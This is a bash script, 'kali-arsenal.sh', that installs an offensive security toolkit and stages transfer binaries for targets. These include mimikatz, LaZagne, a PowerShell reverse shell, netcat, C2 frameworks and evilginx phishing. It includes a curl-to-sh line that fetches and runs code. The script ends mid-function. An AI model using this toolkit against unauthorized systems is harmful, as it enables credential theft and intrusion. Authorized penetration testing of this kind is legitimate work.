#!/usr/bin/env bash
#
# kali-arsenal.sh (v4) — offensive / red-team tooling installer + transfer staging
# =============================================================================
#   FOR AUTHORIZED / LAB / CTF USE ONLY. You must have explicit written
#   permission to test any system you point these tools at.
# =============================================================================
#
#   Staging:
#     /opt/tools            Tools that RUN ON your box (apt/pipx/go/git/C2).
#     ~/tools/{linux,windows,pivot}
#                           Portable binaries you TRANSFER to targets.
#
#   v4 changes:
#     * apt-first C2 (sliver / powershell-empire / starkiller) with automatic
#       fallback to prebuilt binaries / git when a package is absent.
#     * Added: rustscan, gophish (both apt-or-release fallback), neo4j+bloodhound,
#       covert channels (iodine, dnscat2), p0f, RDP clients, docker for Mythic,
#       sshuttle. Optional `--metapackage` pulls kali-linux-large.
#     * Proper, idempotent Go PATH handling in the real user's shell rc.
#
#   Design: run as your normal user (sudo used internally only for apt + /opt);
#   data-driven catalogs (method|source|asset|out|member); idempotent.
#
#   Quick start:
#     ./kali-arsenal.sh --all               # core + C2 + transfer
#     ./kali-arsenal.sh --core              # box tooling (apt+pipx+go+git), no C2
#     ./kali-arsenal.sh --c2                # C2 frameworks
#     ./kali-arsenal.sh --transfer          # ~/tools transfer binaries
#     ./kali-arsenal.sh --all --metapackage # + kali-linux-large (large!)
#     ./kali-arsenal.sh --list | --health | --dry-run
#
set -uo pipefail

# ------------------------------------------------------------------ constants --
SCRIPT_NAME="$(basename "$0")"
OPT_DIR="/opt/tools"
LOG_DIR="/var/log/kali-arsenal"
LOG_FILE=""
FORCE=0
DRY_RUN=0

if [[ -n "${SUDO_USER:-}" && "${SUDO_USER}" != "root" ]]; then
    REAL_USER="${SUDO_USER}"
else
    REAL_USER="$(id -un)"
fi
REAL_HOME="$(getent passwd "${REAL_USER}" | cut -d: -f6)"
[[ -z "${REAL_HOME}" ]] && REAL_HOME="${HOME}"
TRANSFER_DIR="${REAL_HOME}/tools"
GO_BIN="${REAL_HOME}/go/bin"

SUDO=""
[[ ${EUID} -ne 0 ]] && SUDO="sudo"

GH_HDR=()
[[ -n "${GITHUB_TOKEN:-}" ]] && GH_HDR=(-H "Authorization: Bearer ${GITHUB_TOKEN}")

INSTALLED=0; SKIPPED=0; FAILED=0
declare -a FAILED_ITEMS=()
declare -a MANUAL_NOTES=()

# ------------------------------------------------------------------- colours --
if [[ -t 1 ]]; then
    C_RST=$'\e[0m'; C_R=$'\e[31m'; C_G=$'\e[32m'; C_Y=$'\e[33m'
    C_B=$'\e[34m'; C_C=$'\e[36m'; C_BOLD=$'\e[1m'; C_DIM=$'\e[2m'
else
    C_RST=""; C_R=""; C_G=""; C_Y=""; C_B=""; C_C=""; C_BOLD=""; C_DIM=""
fi
_log()    { [[ -n "${LOG_FILE}" ]] && printf '%s %s\n' "$(date '+%F %T')" "$*" >>"${LOG_FILE}" 2>/dev/null; }
info()    { printf '%s[*]%s %s\n' "${C_B}"   "${C_RST}" "$*"; _log "[*] $*"; }
ok()      { printf '%s[+]%s %s\n' "${C_G}"   "${C_RST}" "$*"; _log "[+] $*"; }
warn()    { printf '%s[!]%s %s\n' "${C_Y}"   "${C_RST}" "$*"; _log "[!] $*"; }
err()     { printf '%s[x]%s %s\n' "${C_R}"   "${C_RST}" "$*"; _log "[x] $*"; }
skip()    { printf '%s[=]%s %s\n' "${C_DIM}" "${C_RST}" "$*"; _log "[=] $*"; }
section() { printf '\n%s%s== %s ==%s\n' "${C_BOLD}" "${C_C}" "$*" "${C_RST}"; _log "== $* =="; }
note_manual() { MANUAL_NOTES+=("$*"); }

# ------------------------------------------------------------------- helpers --
run_as_user() {
    if [[ ${EUID} -eq 0 && "${REAL_USER}" != "root" ]]; then
        sudo -u "${REAL_USER}" -H bash -lc "$*"
    else
        bash -lc "$*"
    fi
}
have() { command -v "$1" >/dev/null 2>&1; }

apt_install() {  # apt_install <pkg...> ; returns 0 if all ok; real error -> logfile
    if [[ -n "${LOG_FILE}" ]]; then
        ${SUDO} DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@" >>"${LOG_FILE}" 2>&1
    else
        ${SUDO} DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$@" >/dev/null 2>&1
    fi
}

apt_prepare() {
    # returns 0 if apt looks usable, 1 if repos are unreachable/broken.
    # captures real errors to the logfile and self-heals an interrupted dpkg.
    local upd_err; upd_err="$(mktemp)"
    if ${SUDO} apt-get update -qq >"${upd_err}" 2>&1; then rm -f "${upd_err}"; return 0; fi
    cat "${upd_err}" >>"${LOG_FILE}" 2>/dev/null
    warn "apt-get update failed — attempting self-repair (dpkg --configure -a, apt -f install)"
    ${SUDO} dpkg --configure -a >>"${LOG_FILE}" 2>&1 || true
    ${SUDO} apt-get -f install -y -qq >>"${LOG_FILE}" 2>&1 || true
    if ${SUDO} apt-get update -qq >>"${LOG_FILE}" 2>&1; then rm -f "${upd_err}"; return 0; fi
    # still failing — surface the likely cause from the captured error
    local hint="unknown"
    if   grep -qiE 'could not resolve|temporary failure in name|no address' "${upd_err}"; then hint="DNS/network — the box can't resolve mirrors"
    elif grep -qiE 'connection timed out|failed to fetch|unable to connect|network is unreachable' "${upd_err}"; then hint="no route to mirrors — offline, or blocked by a proxy/firewall"
    elif grep -qiE 'not valid yet|expired|clearsigned|NO_PUBKEY|signature'          "${upd_err}"; then hint="repo signature/clock — check 'date' (a wrong system clock breaks GPG)"
    elif grep -qiE 'held broken packages|unmet dependencies'                         "${upd_err}"; then hint="broken dpkg state — try 'sudo apt --fix-broken install'"
    fi
    err "APT is not usable (${hint}). Full error in the log."
    rm -f "${upd_err}"; return 1
}


gh_tag() {
    local owner="$1" repo="$2" tag=""
    tag="$(curl -fsSL -o /dev/null -w '%{url_effective}' \
            "https://github.com/${owner}/${repo}/releases/latest" 2>/dev/null \
          | sed -n 's#.*/tag/##p')"
    if [[ -z "${tag}" ]]; then
        tag="$(curl -fsSL "${GH_HDR[@]}" \
                "https://api.github.com/repos/${owner}/${repo}/releases/latest" 2>/dev/null \
              | grep -oP '"tag_name":\s*"\K[^"]+' | head -n1)"
    fi
    printf '%s' "${tag}"
}

ensure_go_path() {
    local rc="${REAL_HOME}/.bashrc" line='export PATH="$PATH:$HOME/go/bin"'
    [[ -f "${rc}" ]] || { run_as_user "touch '${rc}'" 2>/dev/null || true; }
    if ! grep -qF 'go/bin' "${rc}" 2>/dev/null; then
        printf '\n# added by kali-arsenal\n%s\n' "${line}" >>"${rc}" 2>/dev/null \
            && ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${rc}" 2>/dev/null || true
    fi
}

ensure_cargo_path() {
    local rc="${REAL_HOME}/.bashrc" line='export PATH="$PATH:$HOME/.cargo/bin"'
    [[ -f "${rc}" ]] || { run_as_user "touch '${rc}'" 2>/dev/null || true; }
    if ! grep -qF '.cargo/bin' "${rc}" 2>/dev/null; then
        printf '\n# added by kali-arsenal (cargo)\n%s\n' "${line}" >>"${rc}" 2>/dev/null \
            && ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${rc}" 2>/dev/null || true
    fi
}

# ================================================================ CATALOGS =====
# ATT&CK phase labels used throughout: RECON · RESOURCE-DEV · INITIAL-ACCESS ·
# EXEC · PERSIST · PRIV-ESC · DEFENSE-EVADE · CRED-ACCESS · DISCOVERY ·
# LATERAL · COLLECTION · C2 · EXFIL
APT_PKGS=(
    # [RECON] active scanning
    nmap masscan rustscan dnsutils dnsenum dnsrecon fierce massdns
    whatweb wafw00f nbtscan onesixtyone snmp sslscan theharvester p0f
    # [INITIAL-ACCESS / DISCOVERY] web exploitation
    ffuf feroxbuster gobuster sqlmap nikto wpscan wfuzz dirb dirsearch
    joomscan seclists wordlists
    # [CRED-ACCESS / LATERAL] SMB / AD / Kerberos / RPC
    smbclient smbmap enum4linux-ng ldap-utils krb5-user evil-winrm responder
    impacket-scripts smtp-user-enum swaks
    # [DISCOVERY] AD graph DB (legacy BloodHound + neo4j)
    neo4j bloodhound
    # [CRED-ACCESS] cracking / spraying
    hydra john hashcat hashid cewl crunch medusa patator chntpw
    # [LATERAL / C2] access, pivoting, covert channels
    freerdp2-x11 remmina rdesktop rlwrap proxychains4 socat sshuttle iodine dnscat2 ligolo-mp
    # [INITIAL-ACCESS] phishing infrastructure
    gophish
    # [EXEC] frameworks / exploit DB / containers
    metasploit-framework exploitdb docker.io docker-compose
    # build / utils
    mingw-w64 golang-go pipx jq git curl wget unzip p7zip-full ripgrep xxd
    net-tools tmux python3-venv
    # rust build deps (for rusthound-ce and cargo tools that need LDAP/Kerberos linking)
    gcc clang libclang-dev libgssapi-krb5-2 libkrb5-dev libsasl2-modules-gssapi-mit musl-tools
)

# packages that frequently AREN'T in apt — verified release fallbacks below
APT_FALLBACK_CHECK=(rustscan gophish ligolo-mp)

PIPX_PKGS=(
    # [LATERAL / CRED-ACCESS] AD offense
    "netexec::nxc"                 "certipy-ad::certipy"
    "bloodyad::bloodyAD"           "coercer::coercer"
    "mitm6::mitm6"                 "ldapdomaindump::ldapdomaindump"
    "bloodhound::bloodhound-python" "pypykatz::pypykatz"
    "lsassy::lsassy"               "donpapi::donpapi"
    "adidnsdump::adidnsdump"       "ldeep::ldeep"
    "certsync::certsync"           "trevorspray::trevorspray"
    "roadrecon::roadrecon"         # [RECON] Azure AD
    # [INITIAL-ACCESS / COLLECTION] web / phishing
    "pwncat-cs::pwncat-cs"
    "git+https://github.com/commixproject/commix.git::commix"   # OS injection
    "xsstrike::xsstrike"           # [INITIAL-ACCESS] XSS scanner (dalfox redundancy)
    "s3scanner::s3scanner"         # [DISCOVERY] open S3 bucket scanner
    "droopescan::droopescan"       # [RECON] Drupal/Silverstripe CMS scanner
    "xsrfprobe::xsrfprobe"         # [INITIAL-ACCESS] CSRF audit + exploitation toolkit
    "git+https://github.com/Dionach/CMSmap.git::cmsmap"   # [RECON] CMS scanner (CMSeeK redundancy)
    # [RECON] subdomain enum
    "sublist3r::sublist3r"         # passive subdomain enum (subfinder redundancy)
    "altdns::altdns"               # subdomain permutation/mutation
    "knock::knockpy"               # DNS subdomain brute
    # [RECON / COLLECTION] secrets
    "name-that-hash::nth"          "git-dumper::git-dumper"
    "arjun::arjun"                 "updog::updog"
    "git+https://github.com/Tib3rius/AutoRecon.git::autorecon"
)

GO_TOOLS=(
    # [RECON] scanning / fingerprinting
    "nuclei|github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "subfinder|github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "httpx|github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "naabu|github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "tlsx|github.com/projectdiscovery/tlsx/cmd/tlsx@latest"
    "asnmap|github.com/projectdiscovery/asnmap/cmd/asnmap@latest"
    "uncover|github.com/projectdiscovery/uncover/cmd/uncover@latest"    # Shodan/Censys/Fofa
    "interactsh-client|github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    "cvemap|github.com/projectdiscovery/cvemap/cmd/cvemap@latest"
    "httprobe|github.com/tomnomnom/httprobe@latest"                     # probe HTTP/S on domain lists
    "subjack|github.com/haccer/subjack@latest"                          # subdomain takeover detection
    # [RECON] crawling / OSINT
    "katana|github.com/projectdiscovery/katana/cmd/katana@latest"
    "dnsx|github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "gau|github.com/lc/gau/v2/cmd/gau@latest"
    "waybackurls|github.com/tomnomnom/waybackurls@latest"
    "qsreplace|github.com/tomnomnom/qsreplace@latest"
    "assetfinder|github.com/tomnomnom/assetfinder@latest"
    "subjs|github.com/lc/subjs@latest"
    "hakrawler|github.com/hakluke/hakrawler@latest"
    "meg|github.com/tomnomnom/meg@latest"                               # fetch paths across many hosts
    # [INITIAL-ACCESS] web exploitation
    "dalfox|github.com/hahwul/dalfox/v2@latest"
    # [CRED-ACCESS / DISCOVERY] AD
    "kerbrute|github.com/ropnop/kerbrute@latest"
    "amass|github.com/owasp-amass/amass/v4/...@master"
    # [COLLECTION] secrets / code scanning
    "gitleaks|github.com/gitleaks/gitleaks/v8@latest"
    "trufflehog|github.com/trufflesecurity/trufflehog/v3@latest"       # git/filesystem secret scan
    # [RECON] screenshots
    "gowitness|github.com/sensepost/gowitness@latest"
)

# cargo install tools: "crate|binary" ----------------------------------------
# primary install via cargo; each has a prebuilt-binary fallback defined in
# install_rust() for when the Rust toolchain isn't available / build deps missing.
CARGO_TOOLS=(
    "rusthound-ce|rusthound-ce"     # BloodHound CE AD ingestor (Rust, cross-compiled)
)

# release binaries installed to /opt/tools/<name> + symlinked to /usr/local/bin.
# reuses the stage() spec format: method|source|asset|out|member
# for tools distributed as prebuilt binaries (not go-installable or in apt).
RELEASE_BINS=(
    "versioned|michenriksen/aquatone|aquatone_linux_amd64_{V}.zip|aquatone|aquatone"   # [RECON] visual recon / screenshots
    "versioned|j3ssie/osmedeus|osmedeus_{V}_linux_amd64.tar.gz|osmedeus|osmedeus"       # [RECON] automated recon framework
)

GIT_REPOS=(
    # [RESOURCE-DEV] payload / wordlist references
    "https://github.com/swisskyrepo/PayloadsAllTheThings|PayloadsAllTheThings"
    "https://github.com/Flangvik/SharpCollection|SharpCollection"
    "https://github.com/peass-ng/PEASS-ng|PEASS-ng"
    # [CRED-ACCESS / LATERAL] AD offense source
    "https://github.com/CravateRouge/bloodyAD|bloodyAD-src"
    "https://github.com/ShutdownRepo/targetedKerberoast|targetedKerberoast"
    "https://github.com/dirkjanm/krbrelayx|krbrelayx"
    # [CRED-ACCESS] DACL / ACE / shadow credentials
    "https://github.com/ShutdownRepo/pywhisker|pywhisker"
    "https://github.com/garrettfoster13/aced|aced"
    "https://github.com/Kevin-Robertson/Powermad|Powermad"
    # [EXEC / PERSIST] GPO abuse
    "https://github.com/Hackndo/pyGPOAbuse|pyGPOAbuse"
    # [CRED-ACCESS] NTLM coerce (3 independent paths)
    "https://github.com/topotam/PetitPotam|PetitPotam"
    "https://github.com/Wh04m1001/DFSCoerce|DFSCoerce"
    "https://github.com/ShutdownRepo/Shadowcoerce|Shadowcoerce"
    # [PRIV-ESC] Kerberos relay local → SYSTEM
    "https://github.com/Dec0ne/KrbRelayUp|KrbRelayUp"
    # [RESOURCE-DEV] shell / payload frameworks
    "https://github.com/samratashok/nishang|nishang"
    "https://github.com/PowerShellMafia/PowerSploit|PowerSploit"
    # [DISCOVERY] LDAP enum
    "https://github.com/ropnop/windapsearch|windapsearch"
    # [DISCOVERY] JS endpoint / CMS fingerprinting
    "https://github.com/GerbenJavado/LinkFinder|LinkFinder"             # JS endpoint extraction
    "https://github.com/Tuhinshubhra/CMSeeK|CMSeeK"                    # CMS detection + exploitation
    "https://github.com/immunIT/Drupwn|Drupwn"                         # Drupal enum/exploit (droopescan redundancy)
    "https://github.com/nsonaniya2010/SubDomainizer|SubDomainizer"     # subdomains hidden in JS files
    # [RECON] subdomain takeover + recon frameworks
    "https://github.com/Ice3man543/SubOver|SubOver"                   # subdomain takeover (subjack redundancy)
    "https://github.com/screetsec/Sudomy|Sudomy"                      # subdomain enum + HTML/CSV reports
    # [DISCOVERY] cloud storage enumeration
    "https://github.com/RhinoSecurityLabs/GCPBucketBrute|GCPBucketBrute"  # GCP bucket enum (S3 redundancy → GCP)
    "https://github.com/m0rtem/CloudFail|CloudFail"                   # CloudFlare origin-IP bypass
    # [INITIAL-ACCESS] XXE exploitation
    "https://github.com/enjoiz/XXEinjector|XXEinjector"               # XXE (direct + OOB)
    # [INITIAL-ACCESS] SSRF
    "https://github.com/swisskyrepo/SSRFmap|SSRFmap"
    # [CRED-ACCESS / COLLECTION] credential / secret scanning
    "https://github.com/clr2of8/DPAT|DPAT"
    "https://github.com/AlessandroZ/LaZagne|LaZagne"
    "https://github.com/Kevin-Robertson/Inveigh|Inveigh"
    "https://github.com/fortra/nanodump|nanodump"
    "https://github.com/securing/DumpsterDiver|DumpsterDiver"           # hardcoded creds / secrets in files
    # [INITIAL-ACCESS] AitM phishing
    "https://github.com/kgretzky/evilginx|evilginx"
)

# C2 --------------------------------------------------------------------------
APT_C2=(sliver powershell-empire starkiller)   # tried first
C2_BINARIES=(                                   # Sliver fallback (prebuilt)
    "latest|BishopFox/sliver|sliver-server_linux|sliver-server|"
    "latest|BishopFox/sliver|sliver-client_linux|sliver-client|"
)
EMPIRE_URL="https://github.com/BC-SECURITY/Empire"
C2_GIT=(                                         # always cloned (no apt/binary)
    "https://github.com/HavocFramework/Havoc|Havoc|build-from-source: make ts-build && make client-build (see docs)"
    "https://github.com/t3l3machus/Villain|Villain|pip3 install -r requirements.txt ; run python3 Villain.py"
    "https://github.com/its-a-feature/Mythic|Mythic|docker: sudo ./mythic-cli install github <agent/profile>"
)
# tools that clone into /opt/tools but need manual build steps (not C2, but similar pattern)
BUILD_GIT_NOTES=(
    "evilginx|cd /opt/tools/evilginx && go build -o evilginx . ; sudo ./evilginx -p phishlets"
    "nanodump|BOF: load nanodump.x64.o into Havoc/CS. Standalone: cd /opt/tools/nanodump && mkdir build && cd build && cmake .. && make"
    "windapsearch|cd /opt/tools/windapsearch && go build -o windapsearch . && sudo ln -sf \$PWD/windapsearch /usr/local/bin/"
    "KrbRelayUp|transfer KrbRelayUp.exe (~/tools/windows) or build: cd /opt/tools/KrbRelayUp && dotnet build"
    "CMSeeK|cd /opt/tools/CMSeeK && pip3 install -r requirements.txt ; run: python3 cmseek.py"
    "DumpsterDiver|cd /opt/tools/DumpsterDiver && pip3 install -r requirements.txt ; run: python3 DumpsterDiver.py"
    "LinkFinder|cd /opt/tools/LinkFinder && pip3 install -r requirements.txt ; run: python3 linkfinder.py"
    "SubOver|cd /opt/tools/SubOver && go build -o subover . && sudo ln -sf \$PWD/subover /usr/local/bin/"
    "Sudomy|cd /opt/tools/Sudomy && pip3 install -r requirements.txt ; run: ./sudomy -d target.com"
    "Drupwn|cd /opt/tools/Drupwn && pip3 install -r requirements.txt ; run: python3 drupwn"
    "SubDomainizer|cd /opt/tools/SubDomainizer && pip3 install -r requirements.txt ; run: python3 SubDomainizer.py -u target.com"
    "GCPBucketBrute|cd /opt/tools/GCPBucketBrute && pip3 install -r requirements.txt ; run: python3 gcpbucketbrute.py"
    "CloudFail|cd /opt/tools/CloudFail && pip3 install -r requirements.txt ; run: python3 cloudfail.py --target target.com"
    "XXEinjector|ruby tool: ruby /opt/tools/XXEinjector/XXEinjector.rb --help (needs ruby)"
)

# transfer binaries: method|source|asset|out|member ---------------------------
TRANSFER_LINUX=(
    "latest|peass-ng/PEASS-ng|linpeas.sh|linpeas.sh|"
    "raw|https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh|||"
    "raw|https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh|||"
    "raw|https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl|||"
    "raw|https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh|||"
    "raw|https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py|||"
    "raw|https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh|||"
    "latest|DominicBreuker/pspy|pspy64|pspy64|"
    "latest|DominicBreuker/pspy|pspy32|pspy32|"
    "latest|liamg/traitor|traitor-amd64|traitor-amd64|"
    "versioned|nicocha30/ligolo-ng|ligolo-ng_agent_{V}_linux_amd64.tar.gz|ligolo-agent-linux-amd64|agent"
    "versioned|jpillora/chisel|chisel_{V}_linux_amd64.gz|chisel-linux-amd64|"
    "versioned|g0h4n/RustHound-CE|rusthound-ce-Linux-gnu-x86_64.tar.gz|rusthound-ce|rusthound-ce|sha256"
    # --- coerce auth (3rd path, MS-FSRVP) ---
    "raw|https://raw.githubusercontent.com/ShutdownRepo/Shadowcoerce/main/shadowcoerce.py|||"
)
TRANSFER_WINDOWS=(
    "latest|peass-ng/PEASS-ng|winPEASx64.exe|winPEASx64.exe|"
    "latest|peass-ng/PEASS-ng|winPEASany.exe|winPEASany.exe|"
    "latest|peass-ng/PEASS-ng|winPEAS.bat|winPEAS.bat|"
    "latest|itm4n/PrivescCheck|PrivescCheck.ps1|PrivescCheck.ps1|"
    "versioned|nicocha30/ligolo-ng|ligolo-ng_agent_{V}_windows_amd64.zip|ligolo-agent-windows-amd64.exe|agent.exe"
    "versioned|jpillora/chisel|chisel_{V}_windows_amd64.zip|chisel-windows-amd64.exe|chisel.exe"
    "latest|itm4n/PrintSpoofer|PrintSpoofer64.exe|PrintSpoofer64.exe|"
    "latest|BeichenDream/GodPotato|GodPotato-NET4.exe|GodPotato-NET4.exe|"
    "latest|antonioCoco/JuicyPotatoNG|JuicyPotatoNG.zip|JuicyPotatoNG.exe|JuicyPotatoNG.exe"
    "latest|antonioCoco/RunasCs|RunasCs.zip|RunasCs.exe|RunasCs.exe"
    "latest|gentilkiwi/mimikatz|mimikatz_trunk.zip|mimikatz.exe|x64/mimikatz.exe"
    "latest|AlessandroZ/LaZagne|LaZagne.exe|LaZagne.exe|"
    "latest|SnaffCon/Snaffler|Snaffler.exe|Snaffler.exe|"
    "versioned|SpecterOps/SharpHound|SharpHound_{TAG}_windows_x86.zip|SharpHound.exe|SharpHound.exe"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpDPAPI.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpChrome.exe|||"
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Inveigh.exe|||"
    # --- SharpCollection: lateral movement / AD enum redundancy ---
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpRDP.exe|||"      # RDP lateral movement
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe|||"    # Kerberos relay → SYSTEM
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpSecDump.exe|||"  # remote SAM/NTDS dump
    "raw|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADSearch.exe|||"      # LDAP enum without BH
    # --- PowerShell: machine account / DNS attacks ---
    "raw|https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1|||"                # MachineAccount + DNS for shadow creds
    "raw|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1|||"
    "raw|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1|||"
    "raw|https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1|||"
    "raw|https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1|||"
    "versioned|g0h4n/RustHound-CE|rusthound-ce-Windows-gnu-x86_64.zip|rusthound-ce.exe|rusthound-ce.exe|sha256"
    "raw|https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe|||"
)
TRANSFER_PIVOT=(
    "versioned|nicocha30/ligolo-ng|ligolo-ng_proxy_{V}_linux_amd64.tar.gz|ligolo-proxy-linux-amd64|proxy"
    "versioned|nicocha30/ligolo-ng|ligolo-ng_agent_{V}_linux_arm64.tar.gz|ligolo-agent-linux-arm64|agent"
    "versioned|go-gost/gost|gost_{V}_linux_amd64.tar.gz|gost-linux-amd64|gost"
)

# ================================================================ stage() ======
spec_name() {
    local method src asset out
    IFS='|' read -r method src asset out _ <<<"$1"
    if   [[ -n "${out}" ]];        then printf '%s' "${out}"
    elif [[ "${method}" == raw ]]; then printf '%s' "$(basename "${src%%\?*}")"
    else printf '%s' "${asset}"; fi
}

stage() {
    local dir="$1" spec="$2"
    local method src asset out member verify_sha256
    IFS='|' read -r method src asset out member verify_sha256 <<<"${spec}"
    [[ "${method}" == "raw" && -z "${out}" ]] && out="$(basename "${src%%\?*}")"
    local label="${out:-${asset}}" target="${dir}/${out}"

    if [[ -e "${target}" && "${FORCE}" -ne 1 ]]; then
        skip "${label} (exists)"; ((SKIPPED++)); return 0
    fi

    local url tag ver name
    case "${method}" in
        raw)    url="${src}" ;;
        latest) url="https://github.com/${src}/releases/latest/download/${asset}" ;;
        versioned)
            tag="$(gh_tag "${src%%/*}" "${src##*/}")"
            [[ -z "${tag}" ]] && { err "${label} (no release tag)"; FAILED_ITEMS+=("${label}"); ((FAILED++)); return 1; }
            ver="${tag#v}"; asset="${asset//\{V\}/${ver}}"; asset="${asset//\{TAG\}/${tag}}"
            url="https://github.com/${src}/releases/download/${tag}/${asset}" ;;
        *) err "${label} (bad method '${method}')"; FAILED_ITEMS+=("${label}"); ((FAILED++)); return 1 ;;
    esac
    name="${asset:-$(basename "${url%%\?*}")}"

    if [[ "${DRY_RUN}" -eq 1 ]]; then
        local sha_note=""; [[ "${verify_sha256}" == "sha256" ]] && sha_note=" [+sha256]"
        info "would fetch ${label}${sha_note}  <-  ${url}"; return 0
    fi

    mkdir -p "${dir}"
    local tmp; tmp="$(mktemp)"
    if ! curl -fsSL --retry 5 --retry-delay 3 --retry-all-errors --connect-timeout 25 --max-time 1800 "${GH_HDR[@]}" -o "${tmp}" "${url}"; then
        err "${label} (download failed)"; rm -f "${tmp}"; FAILED_ITEMS+=("${label}"); ((FAILED++)); return 1
    fi

    # optional SHA256 verification — download ${url}.sha256 sidecar and check
    if [[ "${verify_sha256}" == "sha256" ]]; then
        local sha_tmp; sha_tmp="$(mktemp)"
        if curl -fsSL --connect-timeout 15 "${GH_HDR[@]}" -o "${sha_tmp}" "${url}.sha256" 2>/dev/null; then
            local expected actual
            expected="$(awk '{print $1}' "${sha_tmp}")"
            actual="$(sha256sum "${tmp}" | awk '{print $1}')"
            if [[ "${expected}" != "${actual}" ]]; then
                err "${label} (SHA256 MISMATCH — expected ${expected} got ${actual})"
                rm -f "${tmp}" "${sha_tmp}"; FAILED_ITEMS+=("${label}"); ((FAILED++)); return 1
            fi
            ok "${label} sha256 verified"
        else
            warn "${label} (sha256 sidecar not reachable — proceeding unverified)"
        fi
        rm -f "${sha_tmp}"
    fi

    local produced="" rc=0
    case "${name}" in
        *.tar.gz|*.tgz) tar -xzf "${tmp}" -C "${dir}" "${member}" 2>/dev/null && produced="${dir}/${member}" || rc=1 ;;
        *.zip)          unzip -o -j -q "${tmp}" "${member}" -d "${dir}" 2>/dev/null && produced="${dir}/$(basename "${member}")" || rc=1 ;;
        *.gz)           gunzip -c "${tmp}" > "${target}" 2>/dev/null && produced="${target}" || rc=1 ;;
        *)              mv -f "${tmp}" "${target}" && produced="${target}" || rc=1 ;;
    esac
    rm -f "${tmp}"

    if [[ ${rc} -ne 0 || -z "${produced}" || ! -e "${produced}" ]]; then
        err "${label} (extract failed — asset naming may have changed)"; FAILED_ITEMS+=("${label}"); ((FAILED++)); return 1
    fi
    [[ "${produced}" != "${target}" ]] && mv -f "${produced}" "${target}"
    chmod +x "${target}" 2>/dev/null || true
    ok "${label}"; ((INSTALLED++)); return 0
}

stage_group() {
    local dir="$1"; shift
    local -n arr="$1"
    local e
    for e in "${arr[@]}"; do stage "${dir}" "${e}"; done
}

# ============================================================== installers =====
setup_dirs() {
    info "Preparing ${OPT_DIR} and ${TRANSFER_DIR}"
    ${SUDO} mkdir -p "${OPT_DIR}"
    ${SUDO} chown "${REAL_USER}":"${REAL_USER}" "${OPT_DIR}" 2>/dev/null || true
    mkdir -p "${TRANSFER_DIR}"/{linux,windows,pivot}
}

install_rust() {
    section "Rust toolchain + cargo tools (${#CARGO_TOOLS[@]})"
    local cargo_bin="${REAL_HOME}/.cargo/bin/cargo"

    # --- 1. toolchain: rustup (idempotent) ---
    if [[ -x "${cargo_bin}" ]] && [[ "${FORCE}" -ne 1 ]]; then
        local rv; rv="$(run_as_user "'${cargo_bin}' --version 2>/dev/null" | head -n1)"
        skip "rust toolchain (${rv:-already installed})"
    else
        if [[ "${DRY_RUN}" -eq 1 ]]; then
            info "would install rustup + toolchain via rustup.rs"
        else
            info "installing Rust toolchain via rustup.rs"
            if run_as_user "curl -fsSL --retry 3 https://sh.rustup.rs | sh -s -- -y --no-modify-path >>'${LOG_FILE:-/dev/null}' 2>&1"; then
                ok "Rust toolchain (rustup)"; ((INSTALLED++))
                ensure_cargo_path
            else
                err "rustup install failed — see log. Trying prebuilt binary fallbacks for cargo tools."
                _rust_binary_fallbacks; return
            fi
        fi
    fi
    [[ "${DRY_RUN}" -eq 1 ]] || ensure_cargo_path

    # --- 2. build deps for rusthound-ce (LDAP/Kerberos system linking) ---
    if [[ "${DRY_RUN}" -ne 1 ]]; then
        local dep missing=()
        for dep in gcc clang libclang-dev libkrb5-dev; do
            dpkg -s "${dep}" >/dev/null 2>&1 || missing+=("${dep}")
        done
        if (( ${#missing[@]} )); then
            info "installing missing rusthound-ce build deps: ${missing[*]}"
            apt_install "${missing[@]}" || warn "some build deps failed — rusthound-ce compile may fail, will try prebuilt binary"
        fi
    fi

    # --- 3. cargo install each tool ---
    local entry crate bin flag
    for entry in "${CARGO_TOOLS[@]}"; do
        crate="${entry%%|*}"; bin="${entry##*|}"
        local cargo_bin_path="${REAL_HOME}/.cargo/bin/${bin}"
        if [[ -x "${cargo_bin_path}" ]] && [[ "${FORCE}" -ne 1 ]]; then
            skip "${crate} (${bin})"; ((SKIPPED++)); continue
        fi
